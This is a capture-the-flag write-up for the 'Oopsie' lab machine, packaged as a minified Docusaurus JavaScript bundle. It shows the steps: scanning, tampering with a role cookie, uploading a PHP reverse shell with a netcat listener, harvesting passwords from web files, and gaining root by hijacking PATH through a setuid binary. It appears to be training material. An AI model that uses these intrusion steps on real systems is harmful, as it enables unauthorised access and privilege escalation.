"use strict";(self.webpackChunkmy_website=self.webpackChunkmy_website||[]).push([[675],{3905:function(e,t,n){n.d(t,{Zo:function(){return u},kt:function(){return h}});var r=n(7294);function o(e,t,n){return t in e?Object.defineProperty(e,t,{value:n,enumerable:!0,configurable:!0,writable:!0}):e[t]=n,e}function a(e,t){var n=Object.keys(e);if(Object.getOwnPropertySymbols){var r=Object.getOwnPropertySymbols(e);t&&(r=r.filter((function(t){return Object.getOwnPropertyDescriptor(e,t).enumerable}))),n.push.apply(n,r)}return n}function i(e){for(var t=1;t<arguments.length;t++){var n=null!=arguments[t]?arguments[t]:{};t%2?a(Object(n),!0).forEach((function(t){o(e,t,n[t])})):Object.getOwnPropertyDescriptors?Object.defineProperties(e,Object.getOwnPropertyDescriptors(n)):a(Object(n)).forEach((function(t){Object.defineProperty(e,t,Object.getOwnPropertyDescriptor(n,t))}))}return e}function s(e,t){if(null==e)return{};var n,r,o=function(e,t){if(null==e)return{};var n,r,o={},a=Object.keys(e);for(r=0;r<a.length;r++)n=a[r],t.indexOf(n)>=0||(o[n]=e[n]);return o}(e,t);if(Object.getOwnPropertySymbols){var a=Object.getOwnPropertySymbols(e);for(r=0;r<a.length;r++)n=a[r],t.indexOf(n)>=0||Object.prototype.propertyIsEnumerable.call(e,n)&&(o[n]=e[n])}return o}var l=r.createContext({}),p=function(e){var t=r.useContext(l),n=t;return e&&(n="function"==typeof e?e(t):i(i({},t),e)),n},u=function(e){var t=p(e.components);return r.createElement(l.Provider,{value:t},e.children)},c={inlineCode:"code",wrapper:function(e){var t=e.children;return r.createElement(r.Fragment,{},t)}},d=r.forwardRef((function(e,t){var n=e.components,o=e.mdxType,a=e.originalType,l=e.parentName,u=s(e,["components","mdxType","originalType","parentName"]),d=p(n),h=o,b=d["".concat(l,".").concat(h)]||d[h]||c[h]||a;return n?r.createElement(b,i(i({ref:t},u),{},{components:n})):r.createElement(b,i({ref:t},u))}));function h(e,t){var n=arguments,o=t&&t.mdxType;if("string"==typeof e||o){var a=n.length,i=new Array(a);i[0]=d;var s={};for(var l in t)hasOwnProperty.call(t,l)&&(s[l]=t[l]);s.originalType=e,s.mdxType="string"==typeof e?e:o,i[1]=s;for(var p=2;p<a;p++)i[p]=n[p];return r.createElement.apply(null,i)}return r.createElement.apply(null,n)}d.displayName="MDXCreateElement"},1025:function(e,t,n){n.r(t),n.d(t,{frontMatter:function(){return s},contentTitle:function(){return l},metadata:function(){return p},toc:function(){return u},default:function(){return d}});var r=n(7462),o=n(3366),a=(n(7294),n(3905)),i=["components"],s={},l="Oopsie",p={unversionedId:"Cibersecurity/Writeups/Oopsie",id:"Cibersecurity/Writeups/Oopsie",title:"Oopsie",description:"1. Reconnaissance",source:"@site/docs/Cibersecurity/Writeups/Oopsie.md",sourceDirName:"Cibersecurity/Writeups",slug:"/Cibersecurity/Writeups/Oopsie",permalink:"/docs/Cibersecurity/Writeups/Oopsie",editUrl:"https://github.com/facebook/docusaurus/tree/main/packages/create-docusaurus/templates/shared/docs/Cibersecurity/Writeups/Oopsie.md",tags:[],version:"current",frontMatter:{},sidebar:"tutorialSidebar",previous:{title:"Archetype",permalink:"/docs/Cibersecurity/Writeups/Archetype"},next:{title:"Docusaurus-configuration",permalink:"/docs/Configurations/Docusaurus-configuration"}},u=[{value:"1. Reconnaissance",id:"1-reconnaissance",children:[],level:2},{value:"2. Weaponization",id:"2-weaponization",children:[],level:2},{value:"3. Delivery",id:"3-delivery",children:[],level:2},{value:"4. Exploitation",id:"4-exploitation",children:[],level:2}],c={toc:u};function d(e){var t=e.components,n=(0,o.Z)(e,i);return(0,a.kt)("wrapper",(0,r.Z)({},c,n,{components:t,mdxType:"MDXLayout"}),(0,a.kt)("h1",{id:"oopsie"},"Oopsie"),(0,a.kt)("h2",{id:"1-reconnaissance"},"1. Reconnaissance"),(0,a.kt)("pre",null,(0,a.kt)("code",{parentName:"pre"},"nmap -sC -sV 10.129.233.184\n\nORT   STATE SERVICE VERSION\n22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)\n| ssh-hostkey: \n|   2048 61:e4:3f:d4:1e:e2:b2:f1:0d:3c:ed:36:28:36:67:c7 (RSA)\n|   256 24:1d:a4:17:d4:e3:2a:9c:90:5c:30:58:8f:60:77:8d (ECDSA)\n|_  256 78:03:0e:b4:a1:af:e5:c2:f9:8d:29:05:3e:29:c9:f2 (ED25519)\n80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))\n|_http-server-header: Apache/2.4.29 (Ubuntu)\n|_http-title: Welcome\nService Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel\n")),(0,a.kt)("p",null,"There are two services running, so we start testing the http server.\nWe go to the web server ",(0,a.kt)("em",{parentName:"p"},"http://dest-IP:80"),", where we face a website for automotive. To spot some directories and files that are not visible, we can use Burp and set intercept off. After that, we login as guest and in the inspect element view, we set the role=admin and user=34322 that can be found in the account tab."),(0,a.kt)("p",null,"Hereafter, we go to the Uploads tab and observer that files can be uploaded."),(0,a.kt)("h2",{id:"2-weaponization"},"2. Weaponization"),(0,a.kt)("ol",null,(0,a.kt)("li",{parentName:"ol"},(0,a.kt)("strong",{parentName:"li"},"php-reverse-shell.php")," In order to upload a php reverse shell, we configure our IP. That file is located at /usr/share/webshells/php/php-reverse-shell.php")),(0,a.kt)("h2",{id:"3-delivery"},"3. Delivery"),(0,a.kt)("p",null,"Now we go to the Uploads tab in the webserver and upload the php-reverse-shell.php modified.\nTo find the path where the file is uploaded, whe use ",(0,a.kt)("em",{parentName:"p"},"gobuster")," "),(0,a.kt)("pre",null,(0,a.kt)("code",{parentName:"pre"},"gobuster dir --url http://{TARGET_IP}/ --wordlist /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt -x php\n")),(0,a.kt)("p",null,"We find the folder /uploads/\nWith the aim of obtaining a reverse shell, we use ncat"),(0,a.kt)("pre",null,(0,a.kt)("code",{parentName:"pre"},"nc -lvnp 1234\n")),(0,a.kt)("p",null,"And now, we go to the browser and request our shell through the browser http://{TARGET_IP}/uploads/php-reverse-shell.php. With that obtain a reverse shell."),(0,a.kt)("h2",{id:"4-exploitation"},"4. Exploitation"),(0,a.kt)("p",null,"Now whe have a shell but is not functional yet, so we have to spawn a TTY. This TTY, allows users to interact with the system."),(0,a.kt)("p",null,"There is a singnificant difference between the following concepts that we should bear in mind:"),(0,a.kt)("ul",null,(0,a.kt)("li",{parentName:"ul"},"terminal = tty = text input/output environment"),(0,a.kt)("li",{parentName:"ul"},"console = physical terminal"),(0,a.kt)("li",{parentName:"ul"},"shell = command line interpreter")),(0,a.kt)("p",null,"To stablish a tty on a terminal, we enter:"),(0,a.kt)("pre",null,(0,a.kt)("code",{parentName:"pre"},"python3 -c 'import pty;pty.spawn(\"/bin/bash\")'\n")),(0,a.kt)("p",null,"Because our user's role has restricted access on the system it's important to find a way to do a lateral movement. For this and since the website is making use of PHP and SQL, we can enumerate further the web directory"),(0,a.kt)("pre",null,(0,a.kt)("code",{parentName:"pre"},"cd /var/www/html/cdn-cgi/login\ncat * grep -i passw*\n")),(0,a.kt)("p",null,"Fortunately we find the password ",(0,a.kt)("em",{parentName:"p"},"MEGACORP_4dm1n!!"),". Now we can check the available users on the system by reading the passwd file"),(0,a.kt)("pre",null,(0,a.kt)("code",{parentName:"pre"},"cat /etc/passwd\n\nroot:x:0:0:root:/root:/bin/bash\ndaemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin\nbin:x:2:2:bin:/bin:/usr/sbin/nologin\nsys:x:3:3:sys:/dev:/usr/sbin/nologin\nsync:x:4:65534:sync:/bin:/bin/sync\ngames:x:5:60:games:/usr/games:/usr/sbin/nologin\nman:x:6:12:man:/var/cache/man:/usr/sbin/nologin\nlp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin\nmail:x:8:8:mail:/var/mail:/usr/sbin/nologin\nnews:x:9:9:news:/var/spool/news:/usr/sbin/nologin\nuucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin\nproxy:x:13:13:proxy:/bin:/usr/sbin/nologin\nwww-data:x:33:33:www-data:/var/www:/usr/sbin/nologin\nbackup:x:34:34:backup:/var/backups:/usr/sbin/nologin\nlist:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin\nirc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin\ngnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin\nnobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin\nsystemd-network:x:100:102:systemd Network Management,,,:/run/systemd/netif:/usr/sbin/nologin\nsystemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd/resolve:/usr/sbin/nologin\nsyslog:x:102:106::/home/syslog:/usr/sbin/nologin\nmessagebus:x:103:107::/nonexistent:/usr/sbin/nologin\n_apt:x:104:65534::/nonexistent:/usr/sbin/nologin\nlxd:x:105:65534::/var/lib/lxd/:/bin/false\nuuidd:x:106:110::/run/uuidd:/usr/sbin/nologin\ndnsmasq:x:107:65534:dnsmasq,,,:/var/lib/misc:/usr/sbin/nologin\nlandscape:x:108:112::/var/lib/landscape:/usr/sbin/nologin\npollinate:x:109:1::/var/cache/pollinate:/bin/false\nsshd:x:110:65534::/run/sshd:/usr/sbin/nologin\nrobert:x:1000:1000:robert:/home/robert:/bin/bash\nmysql:x:111:114:MySQL Server,,,:/nonexistent:/bin/false\n\n")),(0,a.kt)("p",null,"We try the password with robert but it is'n for that user. So we read one by one the files at /cdn-cgi/login and we found another password in db.php ",(0,a.kt)("em",{parentName:"p"},"M3g4C0rpUs3r!")," that allow us to login as robert"),(0,a.kt)("pre",null,(0,a.kt)("code",{parentName:"pre"},"su robert\n")),(0,a.kt)("p",null,"The user flag can be found now.\nNow we check our privileges and notice that user robert can't use sudo."),(0,a.kt)("pre",null,(0,a.kt)("code",{parentName:"pre"},"sudo -l\n")),(0,a.kt)("p",null,"So we try to find if robert is part of any interesting group"),(0,a.kt)("pre",null,(0,a.kt)("code",{parentName:"pre"},"id\n")),(0,a.kt)("p",null,"We observe that robert is part of the group bugtracker, so lets find any binary withing that group"),(0,a.kt)("pre",null,(0,a.kt)("code",{parentName:"pre"},"find / -group bugtracker 2>/dev/null\n # 2>/dev/null filter out the error so that they will not be output to the console\n")),(0,a.kt)("p",null,"And a file named ",(0,a.kt)("em",{parentName:"p"},"bugtracker")," is found, so we check what privileges and what type of file is it. "),(0,a.kt)("pre",null,(0,a.kt)("code",{parentName:"pre"},"ls -la /usr/bin/bugtracker && /usr/bin/bugtracker\n-rwsr-xr-- 1 root bugtracker 8792 Jan 25  2020 /usr/bin/bugtracker\n/usr/bin/bugtracker: setuid ELF 64-bit LSB shared object, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/l, for GNU/Linux 3.2.0, BuildID[sha1]=b87543421344c400a95cbbe34bbc885698b52b8d, not stripped\n")),(0,a.kt)("p",null,"There is a suid set on that binary, which is a promising exploitation path.\nNow we run the application to observer how it behaves."),(0,a.kt)("pre",null,(0,a.kt)("code",{parentName:"pre"},"/usr/bin/bugtracker\n\n------------------\n: EV Bug Tracker :\n------------------\n\nProvide Bug ID: 2234  # This is an example to see how it works\n2234\n---------------\n")),(0,a.kt)("p",null,"The tool accepts user input as a name of the file that will be read using the cat command, however, it dows not specifies whole path to file ",(0,a.kt)("em",{parentName:"p"},"cat")," and thus we might be able to exploit this.\nWe navigate to /tmp directory and create a file named ",(0,a.kt)("em",{parentName:"p"},"cat")," with the content ",(0,a.kt)("em",{parentName:"p"},"/bin/sh"),". The we set the execute privileges."),(0,a.kt)("pre",null,(0,a.kt)("code",{parentName:"pre"},"touch cat\necho /bin/sh > cat\nchmod +x cat\n")),(0,a.kt)("p",null,"In order to exploit this we can add the /tmp directory to the PATH environmental variable.(PATH is an environment variable on Unix-like operating systems and Microsoft Windows, specifying a set of directories where executable programs are located)."),(0,a.kt)("pre",null,(0,a.kt)("code",{parentName:"pre"},"export PATH=/tmp:$PATH\n")),(0,a.kt)("p",null,"Finally, we execute the ",(0,a.kt)("em",{parentName:"p"},"bugtracker")," from ",(0,a.kt)("em",{parentName:"p"},"/tmp")," directory and now we are root user because cat has been executed as root (remember the ",(0,a.kt)("em",{parentName:"p"},"setuid")," and the ",(0,a.kt)("em",{parentName:"p"},"s")," from -rwsr-xr--).\nThe root flag can be found in the ",(0,a.kt)("em",{parentName:"p"},"/root")," folder."))}d.isMDXComponent=!0}}]);